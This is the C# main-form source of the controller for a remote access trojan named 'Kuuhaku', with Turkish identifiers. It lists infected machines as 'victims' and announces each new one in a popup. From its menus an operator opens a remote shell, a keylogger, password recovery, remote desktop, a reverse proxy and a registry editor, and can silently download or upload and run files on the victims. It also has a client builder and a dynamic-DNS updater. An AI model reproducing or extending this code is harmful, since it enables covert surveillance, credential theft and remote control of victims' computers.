using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using xServer.Enumlar2;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Ağ.UtilitylerAğ;
using xServer.KuuhakuCekirdek.Eklentiler;
using xServer.KuuhakuCekirdek.Eylemler;
using xServer.KuuhakuCekirdek.Kriptografi;
using xServer.KuuhakuCekirdek.UTIlityler;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardımcılar;
using xServer.Properties;

namespace xServer.Formlar
{
    public partial class AnaForm : Form
    {
        public KuuhakuServer ListenServer { get; set; }
        public static AnaForm Instance { get; private set; }

        private const int STATUS_ID = 4;
        private const int USERSTATUS_ID = 5;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object();
        private void ShowTermsOfService()
        {
            using (var frm = new FrmTermsOfUse())
            {
                frm.ShowDialog();
            }
            Thread.Sleep(300);
        }

        public AnaForm()
        {
            Instance = this;

            AES.SetDefaultKey(Ayarlar.Password);

            InitializeComponent();
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    int selected = Kurbanlar.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("Kuuhaku - Bağlı: {0} [Seçili: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("Kuuhaku - Bağlı: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            ListenServer = new KuuhakuServer();

            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void AutostartListening()
        {
            if (Ayarlar.AutoListen && Ayarlar.UseUPnP)
            {
                UPnP.Initialize(Ayarlar.ListenPort);
                ListenServer.Listen(Ayarlar.ListenPort);
            }
            else if (Ayarlar.AutoListen)
            {
                UPnP.Initialize();
                ListenServer.Listen(Ayarlar.ListenPort);
            }
            else
            {
                UPnP.Initialize();
            }

            if (Ayarlar.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();
            AutostartListening();
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.Disconnect();
            UPnP.DeletePortMap(Ayarlar.ListenPort);
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
            Instance = null;
        }

        private void Kurbanlar_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        private void ServerState(Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (!listening)
                        Kurbanlar.Items.Clear();
                    listenToolStripStatusLabel.Text = listening ? string.Format("Dinlenilen Port: {0}.", port) : "Dinlenilmiyor.";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            if (Ayarlar.ShowPopup)
                                ShowPopup(client.Key);
                            break;
                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                Kurbanlar.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
        private void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address, client.Value.Etiket,
                    client.Value.KullanıcıPcde, client.Value.Versiyon, "Bağlandı", "Aktif", client.Value.ÜlkeKodu,
                    client.Value.IşletimSistemi, client.Value.HesapTürü
                }) { Tag = client, ImageIndex = client.Value.ImageIndex };

                Kurbanlar.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        Kurbanlar.Items.Add(lvi);
                    }
                });

                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }
        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                Kurbanlar.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in Kurbanlar.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            lvi.Remove();
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }
        public void KurbanDurumuAyarla(Client client, string text)
        {
            if (client == null) return;

            try
            {
                Kurbanlar.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.SubItems[STATUS_ID].Text = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void ClientleKurbanDurumuAyarla(Client client, KullanıcıDurumu userStatus)
        {
            if (client == null) return;

            try
            {
                Kurbanlar.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            Kurbanlar.Invoke((MethodInvoker)delegate
            {
                itemClient = Kurbanlar.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });

            return itemClient;
        }

        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            Kurbanlar.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (Kurbanlar.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        Kurbanlar.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }

        private Client[] GetConnectedClients()
        {
            return ListenServer.ConnectedClients;
        }

        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;

                    notifyIcon.ShowBalloonTip(30, string.Format("Yeni Kurban - {0}!", c.Value.Ülke),
                        string.Format("IP Adresi: {0}\nİşletim Sistemi: {1}", c.EndPoint.Address.ToString(),
                        c.Value.IşletimSistemi), ToolTipIcon.Info);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Connection"

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Kurbanlar.SelectedItems.Count != 0)
            {
                using (var frm = new FrmGüncelle(Kurbanlar.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        if (KuuhakuCekirdek.Veri.Update.İndirU)
                        {
                            foreach (Client c in GetSelectedClients())
                            {
                                new KuuhakuCekirdek.Paketler.ServerPaketleri.DoClientUpdate(0, KuuhakuCekirdek.Veri.Update.İndirmeURLsi, string.Empty, new byte[0x00], 0, 0).Execute(c);
                            }
                        }
                        else
                        {
                            new Thread(() =>
                            {
                                bool error = false;
                                foreach (Client c in GetSelectedClients())
                                {
                                    if (c == null) continue;
                                    if (error) continue;

                                    FileSplit srcFile = new FileSplit(KuuhakuCekirdek.Veri.Update.YüklemeDizini);
                                    if (srcFile.MaxBlocks < 0)
                                    {
                                        MessageBox.Show(string.Format("Dosya Okuma Hatası: {0}", srcFile.LastError),
                                            "Yükleme İptal", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }

                                    int id = DosyaYardımcısı.GetNewTransferId();

                                    Eylemİşleyicisi.HandleSetStatus(c,
                                        new KuuhakuCekirdek.Paketler.ClientPaketleri.SetStatus("Dosya Yükleniyor..."));

                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                    {
                                        byte[] block;
                                        if (!srcFile.ReadBlock(currentBlock, out block))
                                        {
                                            MessageBox.Show(string.Format("Dosya Okuma Hatası: {0}", srcFile.LastError),
                                                "Yükleme İptal", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                            error = true;
                                            break;
                                        }
                                        new KuuhakuCekirdek.Paketler.ServerPaketleri.DoClientUpdate(id, string.Empty, string.Empty, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                    }
                                }
                            }).Start();
                        }
                    }
                }
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new KuuhakuCekirdek.Paketler.ServerPaketleri.DoClientReconnect().Execute(c);
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new KuuhakuCekirdek.Paketler.ServerPaketleri.DoClientDisconnect().Execute(c);
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Kurbanlar.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Bu kadar bilgisayardan serveri kaldırmak istediğinizden emin misiniz {0} ?\nSilinenler Geri Gelmez",
                        Kurbanlar.SelectedItems.Count), "Kaldırma Onayı", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    new KuuhakuCekirdek.Paketler.ServerPaketleri.DoClientUninstall().Execute(c);
                }
            }
        }

        #endregion

        #region "System"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmSi != null)
                {
                    c.Value.FrmSi.Focus();
                    return;
                }
                FrmSistemBilgisi frmSI = new FrmSistemBilgisi(c);
                frmSI.Show();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmFm != null)
                {
                    c.Value.FrmFm.Focus();
                    return;
                }
                FrmDosyaYöneticisi frmFM = new FrmDosyaYöneticisi(c);
                frmFM.Show();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmStm != null)
                {
                    c.Value.FrmStm.Focus();
                    return;
                }
                FrmBaşlangıçYöneticisi frmStm = new FrmBaşlangıçYöneticisi(c);
                frmStm.Show();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmTm != null)
                {
                    c.Value.FrmTm.Focus();
                    return;
                }
                FrmGörevYöneticisi frmTM = new FrmGörevYöneticisi(c);
                frmTM.Show();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRs != null)
                {
                    c.Value.FrmRs.Focus();
                    return;
                }
                FrmUzakKabuk frmRS = new FrmUzakKabuk(c);
                frmRS.Show();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmProxy != null)
                {
                    c.Value.FrmProxy.Focus();
                    return;
                }

                FrmTersProxy frmRS = new FrmTersProxy(GetSelectedClients());
                frmRS.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Kurbanlar.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    if (c.Value.FrmRe != null)
                    {
                        c.Value.FrmRe.Focus();
                        return;
                    }

                    FrmKayıtDefteriEditor frmRE = new FrmKayıtDefteriEditor(c);
                    frmRE.Show();
                }
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new KuuhakuCekirdek.Paketler.ServerPaketleri.DoShutdownAction(KapatmaEylemleri.Kapat).Execute(c);
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new KuuhakuCekirdek.Paketler.ServerPaketleri.DoShutdownAction(KapatmaEylemleri.YenidenBaşlat).Execute(c);
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new KuuhakuCekirdek.Paketler.ServerPaketleri.DoShutdownAction(KapatmaEylemleri.BeklemeyeAl).Execute(c);
            }
        }

        #endregion

        #region "Surveillance"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRdp != null)
                {
                    c.Value.FrmRdp.Focus();
                    return;
                }
                FrmUzakMasaüstü frmRDP = new FrmUzakMasaüstü(c);
                frmRDP.Show();
            }
        }

        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmPass != null)
                {
                    c.Value.FrmPass.Focus();
                    return;
                }

                FrmŞifreKurtarımı frmPass = new FrmŞifreKurtarımı(GetSelectedClients());
                frmPass.Show();
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmKl != null)
                {
                    c.Value.FrmKl.Focus();
                    return;
                }
                FrmKeylogger frmKL = new FrmKeylogger(c);
                frmKL.Show();
            }
        }

        #endregion

        #region "Miscellaneous"

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Kurbanlar.SelectedItems.Count != 0)
            {
                using (var frm = new FrmYükleÇalıştır(Kurbanlar.SelectedItems.Count))
                {
                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(YükleÇalıştır.FilePath))
                    {
                        new Thread(() =>
                        {
                            bool error = false;
                            foreach (Client c in GetSelectedClients())
                            {
                                if (c == null) continue;
                                if (error) continue;

                                FileSplit srcFile = new FileSplit(YükleÇalıştır.FilePath);
                                if (srcFile.MaxBlocks < 0)
                                {
                                    MessageBox.Show(string.Format("Dosya Okuma Hatası: {0}", srcFile.LastError),
                                        "Yükleme İptal Edildi", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    error = true;
                                    break;
                                }

                                int id = DosyaYardımcısı.GetNewTransferId();

                                Eylemİşleyicisi.HandleSetStatus(c,
                                    new KuuhakuCekirdek.Paketler.ClientPaketleri.SetStatus("Dosya Yükleniyor..."));

                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                {
                                    byte[] block;
                                    if (srcFile.ReadBlock(currentBlock, out block))
                                    {
                                        new KuuhakuCekirdek.Paketler.ServerPaketleri.DoUploadAndExecute(id,
                                            Path.GetFileName(YükleÇalıştır.FilePath), block, srcFile.MaxBlocks,
                                            currentBlock, YükleÇalıştır.RunHidden).Execute(c);
                                    }
                                    else
                                    {
                                        MessageBox.Show(string.Format("Dosya Okuma Hatası: {0}", srcFile.LastError),
                                            "Yükleme İptal Edildi", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }
                                }
                            }
                        }).Start();
                    }
                }
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Kurbanlar.SelectedItems.Count != 0)
            {
                using (var frm = new FrmİndirÇalıştır(Kurbanlar.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new KuuhakuCekirdek.Paketler.ServerPaketleri.DoDownloadAndExecute(İndirÇalıştır.URL,
                                İndirÇalıştır.RunHidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Kurbanlar.SelectedItems.Count != 0)
            {
                using (var frm = new FrmWebsitesiZiyaret(Kurbanlar.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new KuuhakuCekirdek.Paketler.ServerPaketleri.DoVisitWebsite(WebsiteZiyareti.URL, WebsiteZiyareti.Hidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Kurbanlar.SelectedItems.Count != 0)
            {
                using (var frm = new FrmMesajKutusuGönder(Kurbanlar.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new KuuhakuCekirdek.Paketler.ServerPaketleri.DoShowMessageBox(
                                MesajKutusu.Caption, MesajKutusu.Text, MesajKutusu.Button, MesajKutusu.Icon).Execute(c);
                        }
                    }
                }
            }
        }

        #endregion

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Kurbanlar.SelectAllItems();
        }

        #endregion

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAyarlar(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("DEBUG Modundan Client Kurucu Açılamaz.\nLütfen RELEASE Moduna Geçiniz.", "Kullanılamaz", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmKurucu())
            {
                frm.ShowDialog();
            }
#endif
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmHakkında())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }

        #endregion

        private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {

        }

        private void şarkı1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WMPLib.WindowsMediaPlayer wplayer = new WMPLib.WindowsMediaPlayer();

            wplayer.URL = "1.mp3";
            wplayer.controls.play();
        }

        private void şarkı2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WMPLib.WindowsMediaPlayer wplayer = new WMPLib.WindowsMediaPlayer();

            wplayer.URL = "2.mp3";
            wplayer.controls.play();
        }

        private void şarkıKapatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WMPLib.WindowsMediaPlayer wplayer = new WMPLib.WindowsMediaPlayer();
            wplayer.controls.stop();
        }


        private void testETToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int Portcuk = Ayarlar.ListenPort;
{
                TcpClient tcpScan = new TcpClient();
try
{
tcpScan.Connect("127.0.0.1", Portcuk); 
MessageBox.Show("Port " + Portcuk + " Açık"); 
} 
catch 
{ 
MessageBox.Show("Port " + Portcuk + " Kapalı"); 
} 
}
    }
    }
}